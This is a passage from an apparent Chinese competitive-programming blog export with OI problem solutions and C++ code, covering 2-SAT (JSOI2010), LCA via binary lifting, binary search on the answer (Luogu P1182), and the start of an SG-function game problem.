std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>JSOI</tag>
        <tag>高斯消元</tag>
        <tag>2008</tag>
      </tags>
  </entry>
  <entry>
    <title>「JSOI2010」满汉全席 - 2-SAT</title>
    <url>/jsoi2010-banquet/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4171">洛谷链接</a></p>
<p>大会的规则如下：每位参赛的选手可以得到 <span
class="math inline">\(n\)</span>
种材料，选手可以自由选择用满式或是汉式料理将材料当成菜肴。</p>
<p>大会的评审制度是：共有 <span class="math inline">\(m\)</span>
位评审员分别把关。只要参赛者能在这两种材料的做法中，其中一个符合评审的喜好即可通过该评审的审查。</p>
<p>但大会后来发现，在这样的制度下如果材料选择跟派出的评审员没有特别安排好的话，所有的参赛者最多只能通过部分评审员的审查而不是全部，所以可能会发生没有人通过考核的情形。</p>
<p>所以大会希望有人能写一个程序来判断，所选出的 <span
class="math inline">\(m\)</span>
位评审，会不会发生没有人能通过考核的窘境，以便协会组织合适的评审团。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这是一个 2-SAT 问题。</p>
<p>把 <span class="math inline">\(\text{h}x\)</span> 对应为 <span
class="math inline">\(x\)</span> 节点，把 <span
class="math inline">\(\text{m}x\)</span> 对应为 <span
class="math inline">\(n + x\)</span> 节点。对于一组限制 <span
class="math inline">\(x\)</span>，<span
class="math inline">\(y\)</span>，则说明若选了 <span
class="math inline">\(x \pm n\)</span> 则必选 <span
class="math inline">\(y\)</span>，或若选了 <span class="math inline">\(y
\pm n\)</span> 则必选 <span
class="math inline">\(x\)</span>（前者若为汉式则取加号，若为满式则取减号）。然后跑一遍
2-SAT 就可得出答案。</p>
<p>每组数据前注意要把图清空。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">int</span> dfn, low;</span><br><span class="line">    <span class="type">bool</span> v;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Connected</span> *connected;</span><br><span class="line">&#125; N[<span class="number">2</span> * MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Connected</span> &#123;</span><br><span class="line">    <span class="type">int</span> size, id;</span><br><span class="line">&#125; connecteds[<span class="number">2</span> * MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(Node *x)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> num = <span class="number">0</span>, counts = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> std::stack&lt;Node *&gt; stk;</span><br><span class="line">    x-&gt;dfn = x-&gt;low = ++num;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);</span><br><span class="line">    x-&gt;v = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;x-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;x-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!e-&gt;t-&gt;dfn) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(e-&gt;t);</span><br><span class="line">            x-&gt;low = std::<span class="built_in">min</span>(x-&gt;low, e-&gt;t-&gt;low);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e-&gt;t-&gt;v) &#123;</span><br><span class="line">            x-&gt;low = std::<span class="built_in">min</span>(x-&gt;low, e-&gt;t-&gt;dfn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x-&gt;dfn == x-&gt;low) &#123;</span><br><span class="line">        counts++;</span><br><span class="line">        connecteds[counts].id = counts;</span><br><span class="line">        Node *y;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            y = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            y-&gt;v = <span class="literal">false</span>;</span><br><span class="line">            y-&gt;connected = &amp;connecteds[counts];</span><br><span class="line">            connecteds[counts].size++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (x != y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * MAXN; i++) &#123;</span><br><span class="line">        N[i].e.<span class="built_in">clear</span>();</span><br><span class="line">        N[i].dfn = N[i].low = <span class="number">0</span>;</span><br><span class="line">        N[i].v = <span class="literal">false</span>;</span><br><span class="line">        N[i].connected = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span> * MAXN; i++) &#123;</span><br><span class="line">        connecteds[i].size = connecteds[i].id = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="type">int</span> n, m;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">prepare</span>(n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">            <span class="type">int</span> i, j;</span><br><span class="line">            <span class="type">char</span> a = <span class="string">&#x27; &#x27;</span>, b = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">isspace</span>(a)) a = <span class="built_in">getchar</span>();</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">isspace</span>(b)) b = <span class="built_in">getchar</span>();</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;j);</span><br><span class="line">            a = a == <span class="string">&#x27;h&#x27;</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">            b = b == <span class="string">&#x27;h&#x27;</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (a &amp;&amp; b) &#123;</span><br><span class="line">                <span class="built_in">addEdge</span>(i + n, j);</span><br><span class="line">                <span class="built_in">addEdge</span>(j + n, i);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!a &amp;&amp; b) &#123;</span><br><span class="line">                <span class="built_in">addEdge</span>(i, j);</span><br><span class="line">                <span class="built_in">addEdge</span>(j + n, i + n);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a &amp;&amp; !b) &#123;</span><br><span class="line">                <span class="built_in">addEdge</span>(i + n, j + n);</span><br><span class="line">                <span class="built_in">addEdge</span>(j, i);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!a &amp;&amp; !b) &#123;</span><br><span class="line">                <span class="built_in">addEdge</span>(i, j + n);</span><br><span class="line">                <span class="built_in">addEdge</span>(j, i + n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!N[i].dfn) &#123;</span><br><span class="line">                <span class="built_in">tarjan</span>(&amp;N[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (N[i].connected == N[n + i].connected) &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag) <span class="built_in">puts</span>(<span class="string">&quot;GOOD&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;BAD&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>图论</tag>
        <tag>JSOI</tag>
        <tag>Tarjan</tag>
        <tag>2-SAT</tag>
        <tag>强连通分量</tag>
        <tag>2010</tag>
      </tags>
  </entry>
  <entry>
    <title>最近公共祖先学习笔记</title>
    <url>/lca-notes/</url>
    <content><![CDATA[<h1 id="概念">概念</h1>
<p>最近公共祖先（英文 Lowest Common Ancestor，简称
LCA）定义为树种两个点的公共祖先里面，离根最远的一个。</p>
<span id="more"></span>
<h1 id="实现方法">实现方法</h1>
<h2 id="朴素算法">朴素算法</h2>
<p>先算出两点的深度，取深度最小值，不停寻找父结点直到该深度。之后两点同时找父结点，直到两者的父结点相同，该父结点即为最近公共祖先。易得时间复杂度为
<span class="math inline">\(O(n)\)</span>。</p>
<h2 id="倍增算法">倍增算法</h2>
<h3 id="预处理">预处理</h3>
<p>记录一个数组 <code>fa[u][i]</code>，记录的是结点 <span
class="math inline">\(u\)</span> 向上寻找 <span
class="math inline">\(2^i\)</span> 次父结点所达到的结点，如果不存在则为
<span class="math inline">\(0\)</span>。</p>
<p>可通过二进制拆分 <span class="math inline">\(u\)</span>
的深度（<a href="/bitwise-operator-notes/" title="拆分过程详见之前《位运算学习笔记》博客中的“快速幂”章节">拆分过程详见之前《位运算学习笔记》博客中的“快速幂”章节</a> ），在 <span class="math inline">\(O(\log
n)\)</span> 的时间复杂度下算出
<code>fa[u][i]</code>。利用该方法可以利用递归在 <span
class="math inline">\(O(n \log n)\)</span> 的时间复杂度内预处理完
<code>fa</code> 数组。</p>
<p>下列为预处理 <code>fa</code> 的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getFa</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> f)</span> </span>&#123;</span><br><span class="line">    fa[u][<span class="number">0</span>] = f;</span><br><span class="line">    dep[u] = dep[f] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">20</span>; i++) fa[u][i] = fa[ fa[u][i - <span class="number">1</span>] ][i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v : e[u]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">getFa</span>(v, u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="寻找-lca">寻找 LCA</h3>
<p>与朴素算法类似，不同之处是利用二进制和 <code>fa</code> 数组将复杂度从
<span class="math inline">\(O(n)\)</span> 优化到 <span
class="math inline">\(O(\log n)\)</span>。</p>
<p>原理是从远及近遍历 <code>fa</code>
数组，直到两结点同深度的祖先不相同，此时 <span
class="math inline">\(LCA\)</span>
必定在两祖先之上，然后在祖先之上再次使用 <code>fa</code> 数组遍历，直到
<code>fa[u][0] == fa[v][0]</code> 时，<span
class="math inline">\(LCA\)</span> 为 <span
class="math inline">\(u\)</span> 或 <span
class="math inline">\(v\)</span> 的父结点。该过程相当于将 <span
class="math inline">\(LCA\)</span> 与 <span
class="math inline">\(u\)</span>、<span class="math inline">\(v\)</span>
的深度差拆分成若干个 <span class="math inline">\(2\)</span>
的幂，减少了运算次数，加快运行效率。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lca</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dep[u] &lt; dep[v]) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dep[ fa[u][i] ] &gt;= dep[v] ) &#123;</span><br><span class="line">            u = fa[u][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (u == v) <span class="keyword">return</span> u;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fa[u][i] != fa[v][i]) &#123;</span><br><span class="line">            u = fa[u][i];</span><br><span class="line">            v = fa[v][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fa[u][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="算法复杂度统计">算法复杂度统计</h2>
<table>
<thead>
<tr class="header">
<th>算法</th>
<th>预处理</th>
<th>q 次查询</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>朴素算法</td>
<td><span class="math inline">\(O(n)\)</span></td>
<td><span class="math inline">\(O(qn)\)</span></td>
</tr>
<tr class="even">
<td>倍增算法</td>
<td><span class="math inline">\(O(n \log n)\)</span></td>
<td><span class="math inline">\(O(q \log n)\)</span></td>
</tr>
<tr class="odd">
<td>欧拉序转 RMQ</td>
<td><span class="math inline">\(O(n \log n)\)</span></td>
<td><span class="math inline">\(O(q)\)</span></td>
</tr>
<tr class="even">
<td>Tarjan</td>
<td><span class="math inline">\(O(n)\)</span></td>
<td><span class="math inline">\(O(n + q)\)</span></td>
</tr>
<tr class="odd">
<td>树链剖分</td>
<td><span class="math inline">\(O(n)\)</span></td>
<td><span class="math inline">\(O(q \log n)\)</span></td>
</tr>
</tbody>
</table>
<h1 id="例题">例题</h1>
<p><a href="https://loj.ac/p/10130">LibreOJ #10130. 「一本通 4.4 例
1」点的距离</a></p>
<p>本题由于是树，可利用树的特性做题。</p>
<p>这里可以使用 <span class="math inline">\(LCA\)</span>。因 <span
class="math inline">\(x\)</span>、<span class="math inline">\(y\)</span>
的最短路径种必定会经过 <span
class="math inline">\(LCA\)</span>，故可以将该题转化为求 <span
class="math inline">\(LCA\)</span> 分别与点 <span
class="math inline">\(x\)</span> 和点 <span
class="math inline">\(y\)</span> 的距离。</p>
<p>先求出点 <span class="math inline">\(x\)</span> 与点 <span
class="math inline">\(y\)</span> 的 <span
class="math inline">\(LCA\)</span>，再将 <span
class="math inline">\(LCA\)</span> 与点 <span
class="math inline">\(x\)</span>、点 <span
class="math inline">\(y\)</span> 的深度差相加即为答案。</p>
<p>代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">std::vector&lt;<span class="type">int</span>&gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> fa[MAXN + <span class="number">1</span>][<span class="number">25</span>], dep[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getFa</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> f)</span> </span>&#123;</span><br><span class="line">    fa[u][<span class="number">0</span>] = f;</span><br><span class="line">    dep[u] = dep[f] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">20</span>; i++) fa[u][i] = fa[ fa[u][i - <span class="number">1</span>] ][i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> v : e[u]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">getFa</span>(v, u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lca</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dep[u] &lt; dep[v]) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dep[ fa[u][i] ] &gt;= dep[v] ) &#123;</span><br><span class="line">            u = fa[u][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (u == v) <span class="keyword">return</span> u;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fa[u][i] != fa[v][i]) &#123;</span><br><span class="line">            u = fa[u][i];</span><br><span class="line">            v = fa[v][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fa[u][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, x, y; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        e[x].<span class="built_in">push_back</span>(y);</span><br><span class="line">        e[y].<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">getFa</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    std::cin &gt;&gt; q;</span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> root = <span class="built_in">lca</span>(x, y);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dep[x] + dep[y] - <span class="number">2</span> * dep[root]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>图论</tag>
        <tag>树</tag>
        <tag>最近公共祖先</tag>
        <tag>倍增</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P1182」数列分段 Section II - 二分答案</title>
    <url>/luogu-1182/</url>
    <content><![CDATA[<p><del>学完 wxk 的康复训练</del></p>
<blockquote>
<p>学 wxk 学久了感觉 wxk 有意思，学 OI 学久了感觉 OI 有意思。
——huaruoji</p>
</blockquote>
<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1182">洛谷链接</a></p>
<p>给定一个长度为 <span class="math inline">\(n\)</span> 的整形数列
<span class="math inline">\(A_{1 \sim n}\)</span>，先将其分为 <span
class="math inline">\(m\)</span>
段，并要求每段连续，目前需要一种分法，使得分出的每段和的最大值最小。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<h2 id="整体框架">整体框架</h2>
<p>求最大值最小，显然是一道二分答案题，可以尝试使用二分答案解决问题。</p>
<p>这道题二分答案的方法是二分每段和的最大值，从答案的最大值 <span
class="math inline">\(10^9\)</span>
开始二分。注意二分的最小值为整个数列的单个元素最大值，否则可能会出现最后答案小于数列中的某个数，导致无法分割数列的情况（例如洛谷数据中的第四个测试点）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> l = <span class="number">1</span>, r = MAXN * MAXA;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    std::cin &gt;&gt; a[i];</span><br><span class="line">    <span class="keyword">if</span> (a[i] &gt; l) l = a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">    <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 二分处理</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; l &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure>
<h2 id="细节处理">细节处理</h2>
<p>现在我们已经处理完了，现在的问题是二分出答案后如何检验。</p>
<p>这块可以使用类似均分纸牌的思路，使用贪心解决。</p>
<p>在数列的开头开始扫，不停的加数列中的数，若和大于答案，则把和清空为最后加入的一个数，段数
+1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> cnt = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    sum += a[i];</span><br><span class="line">    <span class="keyword">if</span> (sum &gt; mid) &#123;</span><br><span class="line">        sum = a[i];</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后如果段数大于 <span
class="math inline">\(m\)</span>，则说明答案过小，答案在 <span
class="math inline">\(mid\)</span> 之上。</p>
<p>如果段数小于 <span
class="math inline">\(m\)</span>，则说明答案过大，答案在 <span
class="math inline">\(mid\)</span> 之下。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (cnt &lt;= m) r = mid;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt; m) l = mid + <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100000</span>, MAXA = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> a[MAXN];</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l = <span class="number">1</span>, r = MAXN * MAXA;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; a[i];</span><br><span class="line">        <span class="keyword">if</span> (a[i] &gt; l) l = a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">1</span>, sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum += a[i];</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; mid) &#123;</span><br><span class="line">                sum = a[i];</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cnt &lt;= m) r = mid;</span><br><span class="line">        <span class="keyword">if</span> (cnt &gt; m) l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>贪心</tag>
        <tag>二分</tag>
        <tag>二分答案</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「LibreOJ #10243」移棋子游戏 - 图论 + 博弈论 + SG 函数</title>
    <url>/loj-10243/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://loj.ac/p/10243">LibreOJ 链接</a></p>
<p>给定一个有 <span class="math inline">\(n (n \le 2000)\)</span>
个节点的有向无环图，图中某些节点上有棋子，两名玩家交替移动棋子。</p>
<p>玩家每一步可将任意一颗棋子沿一条有向边移动到另一个点，无法移动者输掉游戏。</p>
<p>对于给定的图和棋子初始位置，双方都会采取最优的行动，询问先手必胜还是先手必败。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题就是在一张有向图中有多枚棋子，每次可沿着有向边移动一枚棋子。当无法移动所有棋子时就输了。</p>
<p>于是我们可以使用 SG 函数过掉此题。对于每个点 <span
class="math inline">\(u\)</span>，我们设 <span
class="math inline">\(\operatorname{SG}(u)\)</span> 表示 <span
class="math inline">\(u\)</span> 的 SG 函数值。显然对于没有出度的点
<span class="math inline">\(t\)</span>，<span
class="math inline">\(\operatorname{SG}(t) = 0\)</span>。</p>
<p>对于点 <span class="math inline">\(u\)</span> 可一步到达的点的集合
<span class="math inline">\(E_u\)</span>，我们可以通过 SG 函数的定义求出
<span class="math inline">\(\operatorname{SG}(u) =
\operatorname{mex}(\{t | t = \operatorname{SG}(v), v \in
E_u\})\)</span>。</p>
<p>整个游戏的 SG 函数值即为原本拥有棋子的点的 SG
函数值的异或。设拥有棋子的点有 <span class="math inline">\(k\)</span>
个，且分别位于 <span class="math inline">\(N_k\)</span>，则整个游戏的 SG
函数值为 <span class="math inline">\(\operatorname{SG}(G) = \oplus_{i =
1}^k\operatorname{SG}(N_k)\)</span>。最后只需判断 <span
class="math inline">\(\operatorname{SG}(G)\)</span> 是否大于 <span
class="math inline">\(0\)</span> 即可。</p>
<h1 id="代码演示">代码演示</h1>
